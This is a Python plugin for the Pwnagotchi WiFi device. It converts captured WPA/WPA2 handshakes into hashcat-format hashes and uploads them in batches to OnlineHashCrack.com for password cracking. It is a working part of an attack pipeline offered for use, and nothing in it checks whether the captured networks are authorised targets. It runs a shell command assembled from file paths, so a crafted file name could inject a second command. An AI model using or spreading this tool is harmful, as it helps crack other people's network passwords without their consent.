import os
import logging
import requests
import time
from datetime import datetime
from threading import Lock
from pwnagotchi.utils import StatusFile
import pwnagotchi.plugins as plugins
from json.decoder import JSONDecodeError

class ohcapi(plugins.Plugin):
    __author__ = 'Rohan Dayaram'
    __version__ = '1.1.0'
    __license__ = 'GPL3'
    __description__ = 'Uploads WPA/WPA2 handshakes to OnlineHashCrack.com using the new API (V2), no dashboard.'

    def __init__(self):
        self.ready = False
        self.lock = Lock()
        try:
            self.report = StatusFile('/root/handshakes/.ohc_uploads', data_format='json')
        except JSONDecodeError:
            os.remove('/root/.ohc_newapi_uploads')
            self.report = StatusFile('/root/handshakes/.ohc_uploads', data_format='json')
        self.skip = list()
        self.last_run = 0  # Track last time periodic tasks were run
        self.internet_active = False  # Track whether internet is currently available

    def on_loaded(self):
        """
        Called when the plugin is loaded.
        """
        required_fields = ['api_key']
        missing = [field for field in required_fields if field not in self.options or not self.options[field]]
        if missing:
            logging.error(f"OHC NewAPI: Missing required config fields: {missing}")
            return

        if 'receive_email' not in self.options:
            self.options['receive_email'] = 'yes'  # default
            
        if 'sleep' not in self.options:
            self.options['sleep'] = 60*60  # default to 1 hour

        self.ready = True
        logging.info("OHC NewAPI: Plugin loaded and ready.")

    def on_webhook(self, path, request):
        from flask import make_response, redirect
        response = make_response(redirect("https://www.onlinehashcrack.com", code=302))
        return response
    
    def on_internet_available(self, agent):
        """
        Called once when the internet becomes available.
        Run upload/download tasks immediately.
        """
        if not self.ready or self.lock.locked():
            return

        self.internet_active = True
        self._run_tasks(agent)  # Run immediately when internet is detected
        self.last_run = time.time()  # Record the time of this run

    def on_ui_update(self, ui):
        """
        Called periodically by the UI. We will use this event to run tasks every 60 seconds if internet is still available.
        """
        if not self.ready:
            return

        # Attempt to get agent from ui
        agent = getattr(ui, '_agent', None)
        if agent is None:
            return

        # Check if the internet is still available by pinging Google
        try:
            response = requests.get('https://www.google.com', timeout=5)
        except requests.ConnectionError:
            self.internet_active = False
            return
            
        if response.status_code == 200:
            self.internet_active = True
        else:
            self.internet_active = False
            return

        current_time = time.time()
        if current_time - self.last_run >= self.options['sleep']:
            self._run_tasks(agent)
            self.last_run = current_time

    def _extract_essid_bssid_from_hash(self, hash_line):
        parts = hash_line.strip().split('*')
        essid = 'unknown_ESSID'
        bssid = '00:00:00:00:00:00'

        if len(parts) > 5:
            essid_hex = parts[5]
            try:
                essid = bytes.fromhex(essid_hex).decode('utf-8', errors='replace')
            except:
                essid = 'unknown_ESSID'

        if len(parts) > 3:
            apmac = parts[3]
            if len(apmac) == 12:
                bssid = ':'.join(apmac[i:i+2] for i in range(0, 12, 2))
                
        if essid == 'unknown_ESSID' or bssid == '00:00:00:00:00:00':
            logging.debug(f"OHC NewAPI: Failed to extract ESSID/BSSID from hash -> {hash_line}")

        return essid, bssid

    def _run_tasks(self, agent):
        """
        Encapsulates the logic of extracting, uploading, and updating tasks.
        """
        with self.lock:
            display = agent.view()
            config = agent.config()
            reported = self.report.data_field_or('reported', default=[])
            processed_stations = self.report.data_field_or('processed_stations', default=[])
            handshake_dir = config['bettercap']['handshakes']

            # Find .pcap files
            handshake_filenames = os.listdir(handshake_dir)
            handshake_paths = [os.path.join(handshake_dir, filename)
                                for filename in handshake_filenames if filename.endswith('.pcap')]

            # If the corresponding .22000 file exists, skip re-upload
            handshake_paths = [p for p in handshake_paths if not os.path.exists(p.replace('.pcap', '.22000'))]

            # Filter out already reported and skipped .pcap files
            handshake_new = set(handshake_paths) - set(reported) - set(self.skip)

            if handshake_new:
                logging.info(f"OHC NewAPI: Processing {len(handshake_new)} new PCAP handshakes.")

                all_hashes = []
                successfully_extracted = []
                essid_bssid_map = {}

                for idx, pcap_path in enumerate(handshake_new):
                    hashes = self._extract_hashes_from_handshake(pcap_path)
                    if hashes:
                        # Extract ESSID and BSSID from the first hash line
                        essid, bssid = self._extract_essid_bssid_from_hash(hashes[0])
                        if (essid, bssid) in processed_stations:
                            logging.debug(f"OHC NewAPI: Station {essid}/{bssid} already processed, skipping {pcap_path}.")
                            self.skip.append(pcap_path)
                            continue

                        all_hashes.extend(hashes)
                        successfully_extracted.append(pcap_path)
                        essid_bssid_map[pcap_path] = (essid, bssid)
                    else:
                        logging.debug(f"OHC NewAPI: No hashes extracted from {pcap_path}, skipping.")
                        self.skip.append(pcap_path)

                # Now upload all extracted hashes
                if all_hashes:
                    batches = [all_hashes[i:i+50] for i in range(0, len(all_hashes), 50)]
                    upload_success = True
                    for batch_idx, batch in enumerate(batches):
                        display.on_uploading(f"onlinehashcrack.com ({(batch_idx+1)*50}/{len(all_hashes)})")
                        if not self._add_tasks(batch):
                            upload_success = False
                            break

                    if upload_success:
                        # Mark all successfully extracted pcaps as reported
                        for pcap_path in successfully_extracted:
                            reported.append(pcap_path)
                            essid, bssid = essid_bssid_map[pcap_path]
                            processed_stations.append((essid, bssid))
                        self.report.update(data={'reported': reported, 'processed_stations': processed_stations})
                        logging.debug("OHC NewAPI: Successfully reported all new handshakes.")
                    else:
                        # Upload failed, skip these pcaps for future attempts
                        for pcap_path in successfully_extracted:
                            self.skip.append(pcap_path)
                        logging.debug("OHC NewAPI: Failed to upload tasks, added to skip list.")
                else:
                    logging.debug("OHC NewAPI: No hashes were extracted from the new pcaps. Nothing to upload.")

                display.on_normal()
            else:
                logging.debug("OHC NewAPI: No new PCAP files to process.")

    def _add_tasks(self, hashes, timeout=30):
        clean_hashes = [h.strip() for h in hashes if h.strip()]
        if not clean_hashes:
            return True  # No hashes to add is success

        payload = {
            'api_key': self.options['api_key'],
            'agree_terms': "yes",
            'action': 'add_tasks',
            'algo_mode': 22000,
            'hashes': clean_hashes,
            'receive_email': self.options['receive_email']
        }

        try:
            result = requests.post('https://api.onlinehashcrack.com/v2',
                                   json=payload,
                                   timeout=timeout)
            result.raise_for_status()
            data = result.json()
            logging.info(f"OHC NewAPI: Add tasks response: {data}")
            return True
        except requests.exceptions.RequestException as e:
            logging.debug(f"OHC NewAPI: Exception while adding tasks -> {e}")
            return False

    def _extract_hashes_from_handshake(self, pcap_path):
        hashes = []
        hcxpcapngtool = '/usr/bin/hcxpcapngtool'
        hccapx_path = pcap_path.replace('.pcap', '.22000')
        hcxpcapngtool_cmd = f"{hcxpcapngtool} -o {hccapx_path} {pcap_path}"
        os.popen(hcxpcapngtool_cmd).read()
        if os.path.exists(hccapx_path) and os.path.getsize(hccapx_path) > 0:
            logging.debug(f"OHC NewAPI: Extracted hashes from {pcap_path}")
            with open(hccapx_path, 'r') as hccapx_file:
                hashes = hccapx_file.readlines()
        else:
            logging.debug(f"OHC NewAPI: Failed to extract hashes from {pcap_path}")
            if os.path.exists(hccapx_path):
                os.remove(hccapx_path)
        return hashes
